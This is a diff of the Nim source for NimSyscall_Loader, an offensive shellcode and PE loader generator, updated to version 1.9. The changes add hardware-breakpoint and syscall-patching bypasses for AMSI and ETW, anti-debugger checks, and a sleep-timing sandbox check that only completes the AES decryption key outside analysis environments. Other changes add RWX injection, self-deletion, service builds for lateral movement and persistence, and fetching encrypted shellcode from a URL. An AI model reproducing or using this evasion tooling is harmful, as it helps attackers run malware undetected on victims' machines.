@@ -29,6 +29,7 @@ import CurrentProcInject
 import RemoteProcInject
 import DInvoke
 import Powershell
+import AntiDebug
 
 
 from system import io
@@ -52,7 +53,7 @@ let banner = """
  / /|  / / / / / / /__/ / /_/ (__  ) /__/ /_/ / / /    / /___/ /_/ / /_/ / /_/ /  __/ /    
 /_/ |_/_/_/ /_/ /_/____/\__, /____/\___/\__,_/_/_/____/_____/\____/\__,_/\__,_/\___/_/     
                        /____/                   /_____/      --> @ShitSecure
-                                                                 v1.8                                            
+                                                                 v1.9                                            
 
 """
 
@@ -61,10 +62,10 @@ echo banner
 #Handle arguments
 
 let helpmenu = """
-NimSyscall_Loader v 1.8
+NimSyscall_Loader v 1.9
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --CallbackExecute --localCreateThread --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --remoteMapSection --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly --service]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --remoteMapSection --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -87,7 +88,7 @@ Options:
   --reflective    Set compiler flags, so that the Loader Nim binary can be reflectively loaded
   --debug    Compiles the binary in debug mode
   --x86    Compiles an x86 binary
-  --wow64    (Compiles a x86 binary that can be by x64 CPUs)
+  --wow64    (Compiles a x86 binary that can be used by x64 CPUs)
   --large    use this for large payloads (bigger than 5MB) as you will get an error "interpretation requires too many iterations" without it
   --noDInvoke    Don't use DInvoke - some older Windows OS Versions may crash when DInvoke is in use, e.g. Windows Server 2012. If you get "SIGSEGV: iilegal storage access. (Attempt to read from nil?)" try to use this option.
   --verbose    Prints output to the console (for troubleshooting purposes)
@@ -95,6 +96,7 @@ Options:
     --psobfs    Pre-obfuscated Powershell Template with Invoke-obfuscation.
     --pslyrics    Add Lyrics as comments to avoid some more detections
   --sourceonly    Dont compile but just create the source code and compile command
+  --RWX    Use RWX memory permissions for Shellcode and PE-Loading (instead of default RX)
   --service    Create a Service binary or DLL, which can be used for Lateral Movement or Persistence
 
 [Payload retrieval options]
@@ -122,6 +124,9 @@ Options:
   --obfuscate    Compile the Nim binary via Denim to make use of LLVM obfuscation
   --sgn    Encode shellcode via SGN before encrypting it´
   --replace    Replace common nim IoC's in the loader like the string 'nim'
+  --noOneShot    By default the Packer uses Hardware Breakpoints to bypass AMSI, but disables it after the payload has been executed. If you want to keep it enabled for the current Thread, use this option.
+  --PatchAMSI    Bypass AMSI by patching an offset of amsi.dll/AmsiScanBuffer via Syscalls
+  --PatchETW    Bypass ETW by patching ntdll.dll/NtTraceEvent via Syscalls
   --AMSIProviderPatch    Patch all AMSI Providers instead of 'amsi.dll' (https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf)
   --AMSINtCreateSectionHook    Hook NtCreateSection to prevent 'amsi.dll' from being loaded (https://waawaa.github.io/es/amsi_bypass-hooking-NtCreateSection/)
   --sandbox value    Include Sandbox Checks of your choice into the loader:
@@ -143,11 +148,12 @@ Options:
   --sleepycrypt    Encrypt the memory of the loader with SleepyCrypt # experimental (Pre-Alpha, not working yet for C2-Stager)
   --fluctuate    Enable ShellcodeFluctuation for local shellcode injection and PE-Loading (Alpha) - no support for remote injection
                  This will only work for C2-Payloads, that use Win32 Sleep in between connection attempts, as that is hooked
-  --antidebug    Checks the BeingDebugged flag of the current process and if it is set, it will quit
+  --noAntidebug    Leave out AntiDebugger Checks
+  --noDefaultSandBox    Leave out default Sandbox Checks
 
 [Syscall retrival technique to use, default is GetSyscallStub to retrievethe stubs from disk]
 
-  --hellsgate    Retrieve Syscalls via Hellsgate technique (for patching AMSI/ETW or shellcode execution/PE injection)
+  --hellsgate    Retrieve Syscalls via Hellsgate technique
   --syswhispers    Embed Syscalls via Syswhispers3 (NimLineWhispers3) technique
         --jump    When using Syswhispers3, use the jumper_randomized technique
 
@@ -232,11 +238,15 @@ var
     arguments: string = ""
     embeddedArguments : bool = false
     AMSI: bool = true
+    oneShot: bool = true
+    AMSIPatch: bool = false
     AMSIProviderPatch: bool = false
     AMSICreateSectionHook: bool = false
     ETW: bool = true
+    ETWPatch: bool = false
     COMVARETW: bool = false
     shellcode: bool = true
+    RWX: bool = false
     callbackexecute: bool = false
     wait: bool = true
     localCreateThread: bool = false
@@ -278,11 +288,12 @@ var
     fluctuate: bool = false
     noDInvoke: bool = false
     metadata: bool = false
-    antidebug: bool = false
+    antidebug: bool = true
+    defaultSandBoxChecks: bool = true
     remoteMapSection: bool = false
     remoteinject: bool = false
 
-let args = docopt(helpmenu, version = "NimSyscall_Loader 1.8")
+let args = docopt(helpmenu, version = "NimSyscall_Loader 1.9")
 
 if args["--file"]:
   let fname = args["--file"]
@@ -292,6 +303,9 @@ if args["--file"]:
 if args["--key"]:
   let keyname = args["--key"]
   envkey = fmt"{keyname}"
+
+if args["--noDefaultSandBox"]:
+    defaultSandBoxChecks = false
 
 if args["--psout"]:
     psout = true
@@ -316,6 +330,9 @@ if args["--shellcode"]:
   csharp = false
   peload = false
 
+if args["--RWX"]:
+  RWX = true
+
 if args["--CallbackExecute"]:
   callbackexecute = true
 
@@ -334,6 +351,14 @@ if args["--peload"]:
   peload = true
   shellcode = false
   csharp = false
+
+if args["--PatchAMSI"]:
+  AMSIPatch = true
+  AMSI = false
+
+if args["--PatchETW"]:
+  ETWPatch = true
+  ETW = false
 
 if args["--shellcodeFile"]:
     retrieveFromFile = true
@@ -560,8 +585,8 @@ if args["--obfuscatefunctions"]:
 if args["--debug"]:
   debugMode = true
 
-if args["--antidebug"]:
-  antidebug = true
+if args["--noAntidebug"]:
+  antidebug = false
 
 if args["--x86"]:
   compileX86 = true
@@ -622,6 +647,18 @@ if ((csharp and shellcode) or (csharp and peload) or (csharp and peinject) or (p
 if (dllclone and dllProxy):
     echo "Error: You can only use one of --dllclone (Sideloading with Koppeling) or --dllProxy (Proxying through the legitimate DLL)!"
     quit(1)
+
+#echo "Key: " & envkey
+# Lets save the last 4 characters of the string in a new variable
+var lastTwo = envkey[^2..^1]
+var fourthtosecondlast = envkey[^4..^3]
+var lastFour = envkey[^4..^1]
+#echo "Last Four: " & lastFour
+#echo "lastTwo: " & lastTwo
+#echo "fourthtosecondlast: " & fourthtosecondlast
+# And save a key without those last 4 characters in a new one
+var firstwithoutlast4 = envkey.replace(lastFour, "")
+#echo "First without last 4 :" & firstwithoutlast4
 
 if (peload and embeddedArguments):
     verbose = true # workaround, something in DInvoke+NoVerbose breaks the arguments
@@ -751,6 +788,7 @@ echo "[*] Enctext length: " & $len(enctext)
 
 # Convert Key to byte sequence
 var expandedkey = toByteSeq(envkey)
+
 
 # AES256 key size is 256 bits or 32 bytes, so we need to pad key with
 # 0 bytes. Not the best crypto, but to be honest - who tries to break AES256??
@@ -958,15 +996,11 @@ let LoadAssemblyStubArgs = """
     assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
     discard calcHard()
 
-when not defined(proxy):
-    when not defined(service):
-        when not defined(cloned):
-            discard main(nil)
-
 when defined(defaultMain):
     when not defined(service):
-        when not defined(cloned):
-            discard main(nil)
+        when defined(notcloned):
+            when not defined(proxy):
+                discard main(nil)
 """
 
 let LoadAssemblyStubNoArgs = """
@@ -982,7 +1016,7 @@ when not defined(proxy):
 
 when defined(defaultMain):
     when not defined(service):
-        when not defined(cloned):
+        when defined(notcloned):
             discard main(nil)
 """
 
@@ -1020,6 +1054,8 @@ let ShellcodeFromFileStub * = fmt"""
         except:
             when defined(verbose):
                 echo obf("[-] Failed to open file: ") & f
+    var enctext: seq[byte] = toByteSeq(encstring)
+    var dectext = newSeq[byte](len(enctext))
 
 """
 
@@ -1329,13 +1365,12 @@ let ShellcodeFromURLStub * = fmt"""
             return dataBuffer.readAll()
 
     var encString = httpGetRequest(obf("{shellcodeURL}"))
+    var enctext: seq[byte] = toByteSeq(encstring)
+    var dectext = newSeq[byte](len(enctext))
+    
 
 """
 
-let ShellcodeDefaultStub * = fmt"""
-    const encstring = slurp"enc.blob"
-
-"""
 
 let Cryptstub1 = """
 import winim/lean
@@ -1350,14 +1385,37 @@ import ptr_math
 #import winim/winstr
 #import winim/utils
 #from winim import winstr,winimbase,windef
+when defined(DInvoke):
+    from packerutils import MyRtlGetCurrentPeb
+when defined(AntiDebug):
+    from winim import LIST_ENTRY,PVOID,ULONG,UNICODE_STRING,UCHAR,BYTE,P_PEB
+
+when defined(ProviderPatch):
+    from winregistry/winregistry import RegHandle,open,enumSubkeys,readString,samRead,enumValueNames
+
+when not defined(DInvoke):
+    proc LdrLoadDll*(PathToFile: PWCHAR, Flags: ULONG, ModuleFileName: PUNICODE_STRING, ModuleHandle: PHANDLE): NTSTATUS {.
+        importc: "LdrLoadDll", dynlib: "ntdll", stdcall, discardable.}
+    proc RtlAddVectoredExceptionHandler*(FirstHandler: ULONG, VectoredHandler: PVOID): PVOID {.
+        importc: "RtlAddVectoredExceptionHandler", dynlib: "ntdll", stdcall, discardable.}
+
+when defined(HardwareETW):
+  from winim/clr import load,clrVariantToString,new,`.`,VT_BSTR,invoke
 
 when defined(csharp):
-    from winim/clr import toCLRVariant,invoke,load,`.`,VT_BSTR
+    from winim/clr import toCLRVariant,invoke,load,`.`,VT_BSTR,clrVariantToString,new
     from os import paramCount,paramStr
 
 when defined(sleep):
     import random
     import times
+
+when defined(SelfDelete):
+    # Don't want to import the everything from winim, only what's really needed
+    from winim import PWCHAR,HANDLE,DELETE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,WINBOOL,FILE_RENAME_INFO,LPWSTR,DWORD,fileRenameInfo,FILE_DISPOSITION_INFO,TRUE
+    from winim import fileDispositionInfo,MAX_PATH,WCHAR,INVALID_HANDLE_VALUE
+    template RtlSecureZeroMemory*(Destination: PVOID, Length: SIZE_T) = zeroMem(Destination, Length)
+    template RtlCopyMemory*(Destination: PVOID, Source: PVOID, Length: SIZE_T) = moveMemory(Destination, Source, Length)
 
 when defined http:
     import winim/inc/winhttp
@@ -1380,6 +1438,9 @@ when defined(COMVARETW):
     import osproc,os
     from winim import PROCESSENTRY32,PROCESSENTRY32A,Process32NextA,Process32FirstA,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS
     from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA,MODULEENTRY32A,TH32CS_SNAPMODULE,Module32FirstA,Module32NextA
+
+when defined(HardwareETW):
+    from winim import CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,TH32CS_SNAPTHREAD,THREADENTRY32,Thread32First,Thread32Next
 
 when not defined(proxy):
     when defined(notcloned):
@@ -1437,6 +1498,33 @@ proc calcHard *(): int =
             rand += 15
     return rand
 
+# we need our custom lstrlenW function here, as otherwise the compiler throws errors when going without dynlib
+proc lstrlenW*(lpString: PWCHAR): int =
+    var i = 0
+    while lpString[i] != 0:
+        inc(i)
+    return i
+
+
+"""
+
+let Cryptstub15 = fmt"""
+when defined(SkipDefaultSandBoxChecks):
+    when defined(AntiDebug):
+        var envkey = obf("{firstwithoutlast4}")
+        var envkey2 = envkey
+    else:
+        var envkey = obf("{envkey}")
+        var envkey2 = obf("{envkey}")
+else:
+    var envkey = obf("{firstwithoutlast4}")
+    var envkey2 = envkey
+var ptrEncText: ptr byte
+var ptrDecText: ptr byte
+when defined(PayloadEmbedded):
+    const encstring = slurp"enc.blob"
+    var enctext: seq[byte] = toByteSeq(encstring)
+    var dectext = newSeq[byte](len(enctext))
 """
 
 let Cryptstub2 = fmt"""
@@ -1444,52 +1532,84 @@ let Cryptstub2 = fmt"""
     var success: BOOL
     when defined(sleepinbetween):
         var sleepbetweentime: int = {sleepinbetween}
-
-    var enctext: seq[byte] = toByteSeq(encstring)
     discard calcHard()
     var key: array[aes256.sizeKey, byte]
     discard calcHard()
-    var envkey: string = obf("{envkey}")
+
 """
 
 let Cryptstub3 = fmt"""
+    #var envkey2 = envkey & "{lastfour}"
     
-    var expandedkey = toByteSeq(envkey)
-    discard calcHard()
-    if ((len(expandedkey) mod aes256.sizeBlock) != 0):
-        when defined(verbose):
-            echo "[*] Key length not a multiple of KeySize: ", aes256.sizeBlock
-            echo "[*] Length: " & $len(expandedkey)
-            echo "[*] Padding Key with null bytes"
-        expandedkey = expandedkey & newSeq[byte](aes256.sizeBlock - (len(expandedkey) mod aes256.sizeBlock))
-        when defined(verbose):
-            echo "[*] New Length: " & $len(expandedkey)
-
-    moveMemory(addr key[0], addr expandedkey[0], len(expandedkey))
-    discard calcHard()
-    var dectext = newSeq[byte](len(enctext))
-
-    var ptrKey = cast[ptr byte](addr key[0])
-    var ptrEncText: ptr byte # = cast[ptr byte](addr encText[0])
-    var ptrDecText: ptr byte # = cast[ptr byte](addr decText[0])
-    let dataLen = uint(len(enctext))
-
-    # Decrypt
-    #dctx.init(ptrKey)
-    #dctx.decrypt(ptrEncText, ptrDecText, dataLen)
-    #dctx.clear()
-
     proc decryptLate(): void =
+        var expandedkey = toByteSeq(envkey2)
+        discard calcHard()
+        if ((len(expandedkey) mod aes256.sizeBlock) != 0):
+            when defined(verbose):
+                echo "[*] Key length not a multiple of KeySize: ", aes256.sizeBlock
+                echo "[*] Length: " & $len(expandedkey)
+                echo "[*] Padding Key with null bytes"
+            expandedkey = expandedkey & newSeq[byte](aes256.sizeBlock - (len(expandedkey) mod aes256.sizeBlock))
+            when defined(verbose):
+                echo "[*] New Length: " & $len(expandedkey)
+
+        moveMemory(addr key[0], addr expandedkey[0], len(expandedkey))
+        discard calcHard()
+        #dectext = newSeq[byte](len(enctext))
+
+        var ptrKey = cast[ptr byte](addr key[0])
+
+        let dataLen = uint(len(enctext))
         when defined(verbose):
             when defined(csharp):
                 echo obf("[!] Decrypting C# Assembly for execution...")
             else:
                 echo obf("[!] Decrypting Payload for execution in memory...")
+        discard calcHard()
         dctx.init(ptrKey)
         discard calcHard()
         dctx.decrypt(ptrEncText, ptrDecText, dataLen)
+        discard calcHard()
         dctx.clear()
 
+"""
+
+let Accelerated_sleepStub * = fmt"""
+
+proc accelerated_sleep*(): void =
+    var 
+        dwStart: DWORD
+        dwEnd: DWORD = 0
+    
+    when defined(DInvoke):
+        dwStart = MyGetTickCount()
+    else:
+        dwStart = GetTickCount()
+
+    # Lets Sleep for two seconds
+    when defined(DInvoke):
+        discard MySleep(1500)
+    else:
+        Sleep(1500)
+
+    when defined(DInvoke):
+        dwEnd = MyGetTickCount()
+    else:
+        dwEnd = GetTickCount()
+    var dwDiff = dwEnd - dwStart
+    # If we slept for less than 2 seconds, we are in a VM
+    if (dwDiff < 1300):
+        quit()
+    else:
+        when defined(verbose):
+            echo obf("[*] We don't appear to be in a sandbox according to the Sleep time")
+        when not defined(AntiDebug):
+            envkey2 = envkey & "{lastFour}"
+        else:
+            envkey2 = envkey2 & "{lastTwo}"
+        when defined(verbose):
+            echo obf("[*] Final Key: ") & envkey2
+accelerated_sleep()
 """
 
 let AmsiNtCreateSectionDecryptStub = fmt"""
@@ -1836,9 +1956,9 @@ let NotepadProcIDStub * = fmt"""
 
 
         when defined spoof_args:
-            tProcPath = newWideCString(joinPath(r"C:\Windows\System32", obf("{customspawnprocess}")) & " " & obf("{spoofArgs}"))
+            tProcPath = newWideCString(obf("{customspawnprocess}") & " " & obf("{spoofArgs}"))
         else:
-            tProcPath = newWideCString(joinPath(r"C:\Windows\System32", obf("{customspawnprocess}")))
+            tProcPath = newWideCString(obf("{customspawnprocess}"))
 
         when defined(blockDLLs) or (obf("{parentProcess}") != ""):
             InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)
@@ -1925,12 +2045,22 @@ proc main(lpParameter: LPVOID) : DWORD {.stdcall.} =
 """
 
 let BeingDebugged * = fmt"""
-import AntiDebug
 if(AmIDebugged()):
   quit()
+else:
+    if(isHeapGrowable()):
+        when defined(verbose):
+            echo obf("[*] We don't appear to be Debugged, continuing...")
+        when defined(SkipDefaultSandBoxChecks):
+            envkey2 = envkey & "{lastFour}"
+        else:    
+            envkey2 = envkey & "{fourthtosecondlast}"
+    else:
+        quit(1)
 """
 
 var stub = Cryptstub1
+stub.add(Cryptstub15)
 
 if (not noDInvoke):
     stub.add(DInvokeStubfirst)
@@ -1939,6 +2069,9 @@ if (not noDInvoke):
     stub.add(DInvokeStubThird)
     stub.add(DInvokeStubFourth)
     stub.add(DInvokeBaseStub)
+
+if (getfreshstub):
+    stub.add(GetSyscallStub)
 
 if(pump):
     # makes no sense to import strenc when strings should be visible in the binary.
@@ -1952,6 +2085,8 @@ if(pump):
             stub.add(genTrustedwords(rand(3500..6200)))
 
 if(antidebug):
+    stub.add(AntiDebugPEBStub)
+    stub.add(IsDebuggerPresentStub)
     stub.add(BeingDebugged)
 
 stub.add(getRandStubNoTab())
@@ -1975,6 +2110,8 @@ if(sandbox):
 if (apihide):
     stub.add(APIHideStub)
 
+if(defaultSandBoxChecks):
+    stub.add(Accelerated_sleepStub)
 
 if(gosleep or remoteETWpatch or remoteAMSIpatch):
     stub.add(SleepStubFirst)
@@ -1983,9 +2120,6 @@ if(gosleep or remoteETWpatch or remoteAMSIpatch):
 
 stub.add(getRandStubNoTab())
 
-if (getfreshstub):
-    stub.add(GetSyscallStub)
-    stub.add(NtProtectSyscallStart)
 
 if (syswhispers):
     if(jump):
@@ -2020,34 +2154,44 @@ if (AMSICreateSectionHook):
     stub.add(AmsiNtCreateSectionDecryptStub)
     stub.add(AMSINtCreateSectionHookStubFirst)
 
+if(AMSI or ETW):
+    stub.add(HardwareBreakpointStub)
+    if(AMSI):
+        stub.add(AMSIExceptionHandlerStub)
+    if(ETW):
+        stub.add(ETWExceptionHandlerStub)
+
+if (AMSIPatch or AMSIProviderPatch or ETWPatch or peload or (localinject == false) or selfdelete):
+    if (not noDInvoke):
+        stub.add(DInvokeLoadLibraryAGetProcAddress)
+        if (selfdelete):
+            stub.add(DInvokeSelfDeleteStubs)
+
 stub.add(MainStub)
 
 stub.add(getRandStub())
 
+if(getfreshstub):
+    stub.add(RetrieveSyscallStubs)
+
 if(unhook):
     if(hellsgate):
-        if (not noDInvoke): stub.add(DInvokeUnhookStubs)
+        if (not noDInvoke):
+            stub.add(DInvokeUnhookStubs)
     elif(getfreshstub):
-        if (not noDInvoke): stub.add(DInvokeUnhookStubs)
-        stub.add(NtProtectVirtualMemoryDelegate)
-        stub.add(NtWriteVirtualMemoryDelegate)
-        stub.add(NtCloseDelegate)
-        stub.add(UnhookSyscalls)
+        if (not noDInvoke):
+            stub.add(DInvokeUnhookStubs)
     elif(syswhispers):
-        if (not noDInvoke): stub.add(DInvokeUnhookStubs)
+        if (not noDInvoke):
+            stub.add(DInvokeUnhookStubs)
     stub.add(UnhookNtdllStub)
-else:
-    if(getfreshstub):
-        stub.add(NtProtectVirtualMemoryDelegate)
-        stub.add(NtWriteVirtualMemoryDelegate)
+
 stub.add(getRandStub())
 
 if (retrieveFromFile):
     stub.add(ShellcodefromFileStub)
 elif (retrieveFromURL):
     stub.add(ShellcodefromURLStub)
-else:
-    stub.add(ShellcodeDefaultStub)
 
 # Only decrypt when sandbox Checks/Unhooking/Sleep is done
 stub.add(getRandStub())
@@ -2058,24 +2202,25 @@ stub.add(Cryptstub3)
 stub.add(getRandStub())
 stub.add(getRandStub())
 
-if (AMSI or AMSIProviderPatch or ETW or peload or (localinject == false) or selfdelete):
-    if (not noDInvoke): stub.add(DInvokeLoadLibraryAGetProcAddress)
-    if (selfdelete):
-        if (not noDInvoke): stub.add(DInvokeSelfDeleteStubs)
-        stub.add(FileDeleteStub)
+if (selfdelete):
+    stub.add(FileDeleteStub)
 stub.add(getRandStub())
 if (localinject):
-    if (AMSI):
+    if(AMSI):
         stub.add(AMSIStub)
+    elif(AMSIPatch):
+        stub.add(AMSIPatchStub)
     elif(AmsiProviderPatch):
         stub.add(AMSIProviderPatchStub)
     elif(AMSICreateSectionHook):
         stub.add(AMSINtCreateSectionHookStub)
+    if(ETWPatch):
+        stub.add(ETWPatchStub)
     if (ETW):
         if (COMVARETW):
             stub.add(ETWCOMVARStub)
         else:
-            stub.add(ETWPatchStub)
+            stub.add(ETWStub)
 stub.add(getRandStub())
 if (remoteETWpatch or remoteAMSIpatch):
     stub.add(RemoteModuleHandleStub)
@@ -2089,8 +2234,6 @@ if (peload):
         if (hellsgate):
             stub.add(PELoadStub)
         elif(getfreshstub):
-            stub.add(NtAllocateVirtualMemoryDelegate)
-            stub.add(ProtectWriteAllocSyscalls)
             stub.add(PELoadStub)
         elif(syswhispers):
             stub.add(PELoadStub)
@@ -2126,10 +2269,6 @@ if (peload):
 
 if (shellcode):
     if (localinject):
-        if (getfreshstub):
-            if (localCreateThread):
-                stub.add(NtCreateThreadExDelegate)
-            stub.add(LocalInjectDelegates)
         stub.add(getRandStub())
         stub.add(LocalInjectStub)
         stub.add(getRandStub())
@@ -2185,10 +2324,6 @@ if (shellcode):
                     stub.add(RemotePatchAMSIStub)
                 stub.add(ShellcoderemoteinjectStub_customprocthird)
         elif (getfreshstub):
-            if(remoteMapSection):
-                stub.add(NtCreateSectionDelegate)
-                stub.add(NtMapViewOfSectionDelegate)
-            stub.add(RemoteInjectDelegates)
             stub.add(getRandStub())
             if (processname == ""):
                 stub.add(NotepadProcIDStub)
@@ -2337,6 +2472,37 @@ elif system.hostOS == "linux":
 if((existingprocessInjection == false) and (remoteinject)):
     basicCompileFlags.add("-d:spawninject ")
 
+if (retrieveFromFile):
+    stub.add(ShellcodefromFileStub)
+elif (retrieveFromURL):
+    stub.add(ShellcodefromURLStub)
+else:
+    basicCompileFlags.add("-d:PayloadEmbedded ")
+
+if(antidebug):
+    basicCompileFlags.add("-d:AntiDebug ")
+
+if(unhook):
+    basicCompileFlags.add("-d:unhook ")
+
+if(not defaultSandBoxChecks):
+    basicCompileFlags.add("-d:SkipDefaultSandBoxChecks ")
+
+if(ETW):
+    basicCompileFlags.add("-d:HardwareETW ")
+
+if(AMSIProviderPatch):
+    basicCompileFlags.add("-d:ProviderPatch ")
+
+if(RWX == false):
+    basicCompileFlags.add("-d:RX ")
+
+if(selfdelete):
+    basicCompileFlags.add("-d:SelfDelete ")
+
+if(AMSI and oneShot):
+    basicCompileFlags.add("-d:oneshot ")
+
 if (dllProxy):
     basicCompileFlags.add("--mm:orc --threads:on ")
     basicCompileFlags.add("-d:proxy ")
@@ -2373,6 +2539,9 @@ if(gosleep):
 
 if(remoteinject):
     basicCompileFlags.add("-d:remoteinject ")
+
+if(remoteMapSection):
+    basicCompileFlags.add("-d:remoteMapSection ")
 
 if(COMVARETW):
     basicCompileFlags.add("-d:COMVARETW ")
@@ -2465,7 +2634,7 @@ else:
     else:
         basicCompileFlags.add("--app=console ")
     if (reflective):
-        basicCompileFlags.add("--app=gui --passL:-Wl,--dynamicbase,--export-all-symbols ")
+        basicCompileFlags.add("--passL:-Wl,--dynamicbase,--export-all-symbols ")
 
 if((syswhispers != true) and (hellsgate != true)):
     if system.hostOS == "windows":
@@ -2641,8 +2810,12 @@ if(dll_out):
     if(dllclone):
         echo fmt"[!] Cloning the DLL {dllToClone} API imports via NetClone/PyClone:"
         when system.hostOS == "windows":
+            echo "[*] Using NetClone with command:"
+            echo fmt"{packerPath}\NetClone\NetClone.exe --target {outfile} --reference {dllToClone} --reference-path {dllToClone} -o {outfile}"
             discard os.execShellCmd(fmt"{packerPath}\NetClone\NetClone.exe --target {outfile} --reference {dllToClone} --reference-path {dllToClone} -o {outfile}")
         else:
+            echo "[*] Using PyClone with command:"
+            echo fmt"{packerPath}\NetClone\PyClone.py --target {outfile} --reference {dllToClone} --reference-path {dllToClone} -o {outfile}"
             discard os.execShellCmd(fmt"{packerPath}\NetClone\PyClone.py --target {outfile} --reference {dllToClone} --reference-path {dllToClone} -o {outfile}")
 
 
